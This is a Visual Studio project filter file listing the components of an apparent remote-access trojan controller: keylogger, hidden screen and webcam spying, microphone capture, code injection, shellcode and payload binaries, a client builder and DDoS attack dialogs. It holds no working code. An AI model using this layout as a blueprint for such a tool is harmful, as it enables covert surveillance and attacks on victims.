<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="源文件">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="头文件">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="资源文件">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="远程终端">
      <UniqueIdentifier>{4b871b2f-ce27-4bfc-a895-ce749a923d6d}</UniqueIdentifier>
    </Filter>
    <Filter Include="远程交谈">
      <UniqueIdentifier>{87d280e1-0e8b-4c9d-9924-a79ec32407e9}</UniqueIdentifier>
    </Filter>
    <Filter Include="文件管理">
      <UniqueIdentifier>{bc52ca23-d2ea-40bf-ac9a-cde93c60f200}</UniqueIdentifier>
    </Filter>
    <Filter Include="播放监听">
      <UniqueIdentifier>{576dfcb5-e96a-4caa-a115-85d4c15fcb76}</UniqueIdentifier>
    </Filter>
    <Filter Include="视频查看">
      <UniqueIdentifier>{3301afde-b62f-4398-88c0-6745727ed0a2}</UniqueIdentifier>
    </Filter>
    <Filter Include="客户生成">
      <UniqueIdentifier>{93baf08d-8741-4c53-9358-5114e7828f69}</UniqueIdentifier>
    </Filter>
    <Filter Include="语音监听">
      <UniqueIdentifier>{852c9c00-7090-487e-9f49-7a74a9825986}</UniqueIdentifier>
    </Filter>
    <Filter Include="语音监听\AudioCoder">
      <UniqueIdentifier>{82a64e6d-0471-4353-ab35-c14a6d6c2bac}</UniqueIdentifier>
    </Filter>
    <Filter Include="屏幕管理">
      <UniqueIdentifier>{993c5573-f913-4635-99d3-544815cfb9fc}</UniqueIdentifier>
    </Filter>
    <Filter Include="屏幕管理\差异屏幕">
      <UniqueIdentifier>{1986ec47-c9fb-4475-9bcc-8fa6fe75ad58}</UniqueIdentifier>
    </Filter>
    <Filter Include="屏幕管理\高速屏幕">
      <UniqueIdentifier>{d12c3674-19b6-435a-901e-5cd2f9fdb52a}</UniqueIdentifier>
    </Filter>
    <Filter Include="屏幕管理\娱乐屏幕">
      <UniqueIdentifier>{5871b2a3-91e6-454e-9141-e81761759da2}</UniqueIdentifier>
    </Filter>
    <Filter Include="屏幕管理\后台屏幕">
      <UniqueIdentifier>{099ea7cf-6552-4ed7-821a-87fcec269407}</UniqueIdentifier>
    </Filter>
    <Filter Include="代理映射">
      <UniqueIdentifier>{7d647bf0-b1df-413d-98dc-c089488c87a8}</UniqueIdentifier>
    </Filter>
    <Filter Include="键盘记录">
      <UniqueIdentifier>{a201517a-ecd0-4b8a-8f01-aa7df9d5e578}</UniqueIdentifier>
    </Filter>
    <Filter Include="系统管理">
      <UniqueIdentifier>{b8089e22-4484-49bc-8a23-14060a6a12e5}</UniqueIdentifier>
    </Filter>
    <Filter Include="输入窗口">
      <UniqueIdentifier>{975c1a78-19d6-4d8b-a906-b40463961117}</UniqueIdentifier>
    </Filter>
    <Filter Include="日志记录">
      <UniqueIdentifier>{63927725-8a62-449a-9171-891c8c0a58e1}</UniqueIdentifier>
    </Filter>
    <Filter Include="全屏锁定">
      <UniqueIdentifier>{a7c4b920-d493-4791-a1fd-7e454de12df6}</UniqueIdentifier>
    </Filter>
    <Filter Include="通信模块">
      <UniqueIdentifier>{837a9973-edd4-4b3b-b7c6-43e02cda06b4}</UniqueIdentifier>
    </Filter>
    <Filter Include="压力测试">
      <UniqueIdentifier>{f864fe3b-2248-40e1-81fd-5cc99359e36d}</UniqueIdentifier>
    </Filter>
    <Filter Include="登录验证">
      <UniqueIdentifier>{51688bd8-3e03-483b-94be-463cbe3413f0}</UniqueIdentifier>
    </Filter>
    <Filter Include="系统统计">
      <UniqueIdentifier>{d62ecf01-b9dd-43ff-b1b6-3600b8f59efa}</UniqueIdentifier>
    </Filter>
    <Filter Include="提示窗口">
      <UniqueIdentifier>{99377bff-0f65-4fe3-9323-267244c861f6}</UniqueIdentifier>
    </Filter>
    <Filter Include="插件管理">
      <UniqueIdentifier>{3470a338-7b36-4668-9422-548e070e3bcb}</UniqueIdentifier>
    </Filter>
    <Filter Include="屏幕监控">
      <UniqueIdentifier>{221ef443-43a2-4330-acd2-cc9663c35708}</UniqueIdentifier>
    </Filter>
    <Filter Include="查注册表">
      <UniqueIdentifier>{d1c2281a-bc96-46f0-969e-ffce1660720e}</UniqueIdentifier>
    </Filter>
    <Filter Include="第三方库">
      <UniqueIdentifier>{2df6422f-cac2-4d3f-af77-77b06a41db29}</UniqueIdentifier>
    </Filter>
    <Filter Include="互动插件">
      <UniqueIdentifier>{a41802d6-96a5-41ce-839d-3545515be0e9}</UniqueIdentifier>
    </Filter>
    <Filter Include="驱动功能">
      <UniqueIdentifier>{edeca2d3-1c5c-439d-8d82-2db2e14b8fc7}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <None Include="res\Quick.rc2">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\QuickDoc.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\Quick.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\Toolbar.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\paneicons.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\Debug\Debug\res\GuoQiICO\signal0.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\Debug\Debug\res\GuoQiICO\signal20.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\Debug\Debug\res\GuoQiICO\signal40.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\Debug\Debug\res\GuoQiICO\signal60.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\Debug\Debug\res\GuoQiICO\signal80.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\Debug\Debug\res\GuoQiICO\signal100.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\signal80.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\signal60.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\signal40.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\signal20.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\signal100.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\signal0.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\hrose.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\hrose.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\map.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\computer.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\os.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\SXT.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\qq.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\GuoQiICO\sd.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\login.wav">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\Offline.wav">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\guoqiico\icon210.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\relogin.wav">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\shell.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\titel\bitmap1.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\titel\bitmap2.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\titel\bitmap3.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\titel\bitmap4.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\chat.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\FILE.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\toolbar1.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\cur\1.cur">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\cur\2.cur">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\cur\3.cur">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\cur\4.cur">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\cur\harrow.cur">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\Icon_A.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\Icon_C.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\Icon_D.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\Icon_E.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\Icon_F.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\Icon_G.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\FileToolBarDisable.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\FileToolBarHot.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\regedit.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\201.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\202.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\203.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\204.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\205.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\206.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\speaker.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\mic.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\screen.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\cur\dot.cur">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\proxifler.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\Service.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\dec.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\upx.exe">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\bxsdk32.dll">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\machine.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\1-IP.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\2-os.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\3-CPU.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\4-Memory.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\5-disk.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\6-UserName.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\7-Active.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\8-Anti.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\9-T-Port.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\10-Double.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\search.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\wall.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\hwnd.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\hwnd.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\hwnd.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\cur\hwnd.cur">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\guoqiico\icon218.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\favicon.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\inject.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\toolbar1.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\toolbarrightmenu.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\bmp00001.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\toolbar2.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\toolbar3.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\toolbarlist.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\toolbardate.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\toolbarchoose.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\toolbarother.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\Debug\Plugins\x86\上线模块.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\Debug\Plugins\x64\上线模块.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\imagioc\ToolbarRename.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\cmd.txt" />
    <None Include="res\qqwry.dat" />
    <None Include="res\dlgico\ddos.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\Watermark.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\WatermarkTEST.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\Debug\Plugins\x86\ShellCode32.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\Debug\Plugins\x64\ShellCode64.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\Debug\Plugins\x86\payload32.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\Debug\Plugins\x64\payload64.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\key.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\WinRAR.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\h.ICO">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\rightmenuico\fire.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\Quick.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\dlgico\task.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\008.ico">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\Debug\Plugins\x86\ShellCode.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\Debug\Plugins\x64\ShellCode.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\主插件\Release\播放监听.dll" />
    <None Include="..\..\主插件\Release\查注册表.dll" />
    <None Include="..\..\主插件\Release\差异屏幕.dll" />
    <None Include="..\..\主插件\Release\代理映射.dll" />
    <None Include="..\..\主插件\Release\高速屏幕.dll" />
    <None Include="..\..\主插件\Release\后台屏幕.dll" />
    <None Include="..\..\主插件\Release\键盘记录.dll" />
    <None Include="..\..\主插件\Release\前台窗口.dll" />
    <None Include="..\..\主插件\Release-exe\上线模块.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\主插件\Release\上线模块.dll" />
    <None Include="..\..\主插件\Release\视频查看.dll" />
    <None Include="..\..\主插件\Release\文件管理.dll" />
    <None Include="..\..\主插件\Release\系统管理.dll" />
    <None Include="..\..\主插件\Release\语音监听.dll" />
    <None Include="..\..\主插件\Release\远程交谈.dll" />
    <None Include="..\..\主插件\Release\远程终端.dll" />
    <None Include="..\..\主插件\Release\注入管理.dll" />
    <None Include="..\..\主插件\Release\娱乐屏幕.dll" />
    <None Include="..\..\主插件\Release\压力测试.dll" />
    <None Include="..\..\主插件\Release\计划任务.dll" />
    <None Include="..\..\主插件\Release\登录模块.dll" />
    <None Include="..\..\主插件\shellcode\Release\ShellCode.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\主插件\x64\Release\播放监听.dll" />
    <None Include="..\..\主插件\x64\Release\查注册表.dll" />
    <None Include="..\..\主插件\x64\Release\差异屏幕.dll" />
    <None Include="..\..\主插件\x64\Release\代理映射.dll" />
    <None Include="..\..\主插件\x64\Release\高速屏幕.dll" />
    <None Include="..\..\主插件\x64\Release\后台屏幕.dll" />
    <None Include="..\..\主插件\x64\Release\键盘记录.dll" />
    <None Include="..\..\主插件\x64\Release\前台窗口.dll" />
    <None Include="..\..\主插件\x64\Release-exe\上线模块.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\主插件\x64\Release\上线模块.dll" />
    <None Include="..\..\主插件\x64\Release\视频查看.dll" />
    <None Include="..\..\主插件\x64\Release\文件管理.dll" />
    <None Include="..\..\主插件\x64\Release\系统管理.dll" />
    <None Include="..\..\主插件\x64\Release\语音监听.dll" />
    <None Include="..\..\主插件\x64\Release\远程交谈.dll" />
    <None Include="..\..\主插件\x64\Release\远程终端.dll" />
    <None Include="..\..\主插件\x64\Release\注入管理.dll" />
    <None Include="..\..\主插件\x64\Release\娱乐屏幕.dll" />
    <None Include="..\..\主插件\x64\Release\压力测试.dll" />
    <None Include="..\..\主插件\x64\Release\计划任务.dll" />
    <None Include="..\..\主插件\x64\Release\登录模块.dll" />
    <None Include="..\..\主插件\shellcode\x64\Release\ShellCode.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\主插件\Release\ShellCode.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\主插件\x64\Release\ShellCode.bin">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\toolbarrightmenusmall.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="res\ImagIoc\toolbarrightmenu_24.bmp">
      <Filter>资源文件</Filter>
    </None>
    <None Include="..\..\主插件\Release\驱动插件.dll" />
    <None Include="..\..\主插件\x64\Release\驱动插件.dll" />
    <None Include="..\..\主插件\Release\执行代码.dll" />
    <None Include="..\..\主插件\x64\Release\执行代码.dll" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Quick.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="stdafx.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="MainFrm.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="QuickDoc.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="QuickView.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="Resource.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="Buffer.h">
      <Filter>通信模块</Filter>
    </ClInclude>
    <ClInclude Include="HPSocket.h">
      <Filter>通信模块</Filter>
    </ClInclude>
    <ClInclude Include="HpTcpServer.h">
      <Filter>通信模块</Filter>
    </ClInclude>
    <ClInclude Include="HPTypeDef.h">
      <Filter>通信模块</Filter>
    </ClInclude>
    <ClInclude Include="ISocketBase.h">
      <Filter>通信模块</Filter>
    </ClInclude>
    <ClInclude Include="SocketInterface.h">
      <Filter>通信模块</Filter>
    </ClInclude>
    <ClInclude Include="zconf.h">
      <Filter>通信模块</Filter>
    </ClInclude>
    <ClInclude Include="zlib.h">
      <Filter>通信模块</Filter>
    </ClInclude>
    <ClInclude Include="HpUdpServer.h">
      <Filter>通信模块</Filter>
    </ClInclude>
    <ClInclude Include="ShellDlg.h">
      <Filter>远程终端</Filter>
    </ClInclude>
    <ClInclude Include="C_cmd.h">
      <Filter>远程终端</Filter>
    </ClInclude>
    <ClInclude Include="Chat.h">
      <Filter>远程交谈</Filter>
    </ClInclude>
    <ClInclude Include="LockDlg.h">
      <Filter>全屏锁定</Filter>
    </ClInclude>
    <ClInclude Include="FileTransferModeDlg.h">
      <Filter>文件管理</Filter>
    </ClInclude>
    <ClInclude Include="FileManagerDlg.h">
      <Filter>文件管理</Filter>
    </ClInclude>
    <ClInclude Include="LFileName.h">
      <Filter>文件管理</Filter>
    </ClInclude>
    <ClInclude Include="RegeditDlg.h">
      <Filter>查注册表</Filter>
    </ClInclude>
    <ClInclude Include="RegeditTextDlg.h">
      <Filter>查注册表</Filter>
    </ClInclude>
    <ClInclude Include="SpeakerDlg.h">
      <Filter>播放监听</Filter>
    </ClInclude>
    <ClInclude Include="AudioRender.h">
      <Filter>播放监听</Filter>
    </ClInclude>
    <ClInclude Include="AudioCapture.h">
      <Filter>播放监听</Filter>
    </ClInclude>
    <ClInclude Include="WebCamDlg.h">
      <Filter>视频查看</Filter>
    </ClInclude>
    <ClInclude Include="VideoCodec.h">
      <Filter>视频查看</Filter>
    </ClInclude>
    <ClInclude Include="BuildDlg.h">
      <Filter>客户生成</Filter>
    </ClInclude>
    <ClInclude Include="AudioCode.h">
      <Filter>语音监听\AudioCoder</Filter>
    </ClInclude>
    <ClInclude Include="WaveIn.h">
      <Filter>语音监听\AudioCoder</Filter>
    </ClInclude>
    <ClInclude Include="WaveOut.h">
      <Filter>语音监听\AudioCoder</Filter>
    </ClInclude>
    <ClInclude Include="WavePlayback.h">
      <Filter>语音监听\AudioCoder</Filter>
    </ClInclude>
    <ClInclude Include="WaveRecord.h">
      <Filter>语音监听\AudioCoder</Filter>
    </ClInclude>
    <ClInclude Include="AudioDlg.h">
      <Filter>语音监听</Filter>
    </ClInclude>
    <ClInclude Include="SoundToWav.h">
      <Filter>语音监听\AudioCoder</Filter>
    </ClInclude>
    <ClInclude Include="CursorInfo.h">
      <Filter>屏幕管理</Filter>
    </ClInclude>
    <ClInclude Include="ProxyMapDlg.h">
      <Filter>代理映射</Filter>
    </ClInclude>
    <ClInclude Include="KeyBoardDlg.h">
      <Filter>键盘记录</Filter>
    </ClInclude>
    <ClInclude Include="MachineDlg.h">
      <Filter>系统管理</Filter>
    </ClInclude>
    <ClInclude Include="macros.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="DifScreenSpyDlg.h">
      <Filter>屏幕管理\差异屏幕</Filter>
    </ClInclude>
    <ClInclude Include="QuickScreenSpyDlg.h">
      <Filter>屏幕管理\高速屏幕</Filter>
    </ClInclude>
    <ClInclude Include="HideScreenSpyDlg.h">
      <Filter>屏幕管理\后台屏幕</Filter>
    </ClInclude>
    <ClInclude Include="CTextDlg.h">
      <Filter>输入窗口</Filter>
    </ClInclude>
    <ClInclude Include="InputDlg.h">
      <Filter>输入窗口</Filter>
    </ClInclude>
    <ClInclude Include="jconfig.h">
      <Filter>屏幕管理</Filter>
    </ClInclude>
    <ClInclude Include="jerror.h">
      <Filter>屏幕管理</Filter>
    </ClInclude>
    <ClInclude Include="jmorecfg.h">
      <Filter>屏幕管理</Filter>
    </ClInclude>
    <ClInclude Include="jpeglib.h">
      <Filter>屏幕管理</Filter>
    </ClInclude>
    <ClInclude Include="turbojpeg.h">
      <Filter>屏幕管理</Filter>
    </ClInclude>
    <ClInclude Include="H264ScreenSpyDlg.h">
      <Filter>屏幕管理\娱乐屏幕</Filter>
    </ClInclude>
    <ClInclude Include="C_avcodec-57.h">
      <Filter>屏幕管理\娱乐屏幕</Filter>
    </ClInclude>
    <ClInclude Include="C_avutil-55.h">
      <Filter>屏幕管理\娱乐屏幕</Filter>
    </ClInclude>
    <ClInclude Include="PlugView.h">
      <Filter>插件管理</Filter>
    </ClInclude>
    <ClInclude Include="xvid.h">
      <Filter>视频查看</Filter>
    </ClInclude>
    <ClInclude Include="XvidDec.h">
      <Filter>视频查看</Filter>
    </ClInclude>
    <ClInclude Include="DDOSAttackDlg.h">
      <Filter>压力测试</Filter>
    </ClInclude>
    <ClInclude Include="FlowAttackDlg.h">
      <Filter>压力测试</Filter>
    </ClInclude>
    <ClInclude Include="WebAttackDlg.h">
      <Filter>压力测试</Filter>
    </ClInclude>
    <ClInclude Include="EasySize.h">
      <Filter>压力测试</Filter>
    </ClInclude>
    <ClInclude Include="ProxyConnectServer.h">
      <Filter>代理映射</Filter>
    </ClInclude>
    <ClInclude Include="LOGIN.h">
      <Filter>登录验证</Filter>
    </ClInclude>
    <ClInclude Include="ipc.h">
      <Filter>日志记录</Filter>
    </ClInclude>
    <ClInclude Include="helper.h">
      <Filter>日志记录</Filter>
    </ClInclude>
    <ClInclude Include="LogView.h">
      <Filter>日志记录</Filter>
    </ClInclude>
    <ClInclude Include="TabView.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="C_log.h">
      <Filter>日志记录</Filter>
    </ClInclude>
    <ClInclude Include="ChartView.h">
      <Filter>系统统计</Filter>
    </ClInclude>
    <ClInclude Include="TipCtrl.h">
      <Filter>提示窗口</Filter>
    </ClInclude>
    <ClInclude Include="ScreenMonitorDlg.h">
      <Filter>屏幕监控</Filter>
    </ClInclude>
    <ClInclude Include="md5.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="TKYLockRW.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="BmpToAvi.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="BmpToAvidif.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="MovieMaker.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="SEU_QQwry.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="C_bxsdk.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="MemoryModule.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="WinlicenseSDK.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="ExpandDlg.h">
      <Filter>互动插件</Filter>
    </ClInclude>
    <ClInclude Include="base64.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="DllToShellCode.h">
      <Filter>第三方库</Filter>
    </ClInclude>
    <ClInclude Include="ChangeGroupDlg.h">
      <Filter>输入窗口</Filter>
    </ClInclude>
    <ClInclude Include="CopyClientDlg.h">
      <Filter>输入窗口</Filter>
    </ClInclude>
    <ClInclude Include="TipfileCtrl.h">
      <Filter>提示窗口</Filter>
    </ClInclude>
    <ClInclude Include="CFileListCtrl.h">
      <Filter>文件管理</Filter>
    </ClInclude>
    <ClInclude Include="ServiceInfoDlg.h">
      <Filter>系统管理</Filter>
    </ClInclude>
    <ClInclude Include="CCreateTaskDlg.h">
      <Filter>系统管理</Filter>
    </ClInclude>
    <ClInclude Include="KernelDlg.h">
      <Filter>驱动功能</Filter>
    </ClInclude>
    <ClInclude Include="LocalUpload.h">
      <Filter>输入窗口</Filter>
    </ClInclude>
    <ClInclude Include="InjectCodeDlg.h">
      <Filter>系统管理</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Quick.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="stdafx.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="MainFrm.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="QuickDoc.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="QuickView.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="Buffer.cpp">
      <Filter>通信模块</Filter>
    </ClCompile>
    <ClCompile Include="ISocketBase.cpp">
      <Filter>通信模块</Filter>
    </ClCompile>
    <ClCompile Include="HpTcpServer.cpp">
      <Filter>通信模块</Filter>
    </ClCompile>
    <ClCompile Include="HpUdpServer.cpp">
      <Filter>通信模块</Filter>
    </ClCompile>
    <ClCompile Include="ShellDlg.cpp">
      <Filter>远程终端</Filter>
    </ClCompile>
    <ClCompile Include="Chat.cpp">
      <Filter>远程交谈</Filter>
    </ClCompile>
    <ClCompile Include="LockDlg.cpp">
      <Filter>全屏锁定</Filter>
    </ClCompile>
    <ClCompile Include="FileManagerDlg.cpp">
      <Filter>文件管理</Filter>
    </ClCompile>
    <ClCompile Include="FileTransferModeDlg.cpp">
      <Filter>文件管理</Filter>
    </ClCompile>
    <ClCompile Include="LFileName.cpp">
      <Filter>文件管理</Filter>
    </ClCompile>
    <ClCompile Include="RegeditDlg.cpp">
      <Filter>查注册表</Filter>
    </ClCompile>
    <ClCompile Include="RegeditTextDlg.cpp">
      <Filter>查注册表</Filter>
    </ClCompile>
    <ClCompile Include="SpeakerDlg.cpp">
      <Filter>播放监听</Filter>
    </ClCompile>
    <ClCompile Include="AudioRender.cpp">
      <Filter>播放监听</Filter>
    </ClCompile>
    <ClCompile Include="AudioCapture.cpp">
      <Filter>播放监听</Filter>
    </ClCompile>
    <ClCompile Include="WebCamDlg.cpp">
      <Filter>视频查看</Filter>
    </ClCompile>
    <ClCompile Include="BuildDlg.cpp">
      <Filter>客户生成</Filter>
    </ClCompile>
    <ClCompile Include="AudioCode.cpp">
      <Filter>语音监听\AudioCoder</Filter>
    </ClCompile>
    <ClCompile Include="WaveIn.cpp">
      <Filter>语音监听\AudioCoder</Filter>
    </ClCompile>
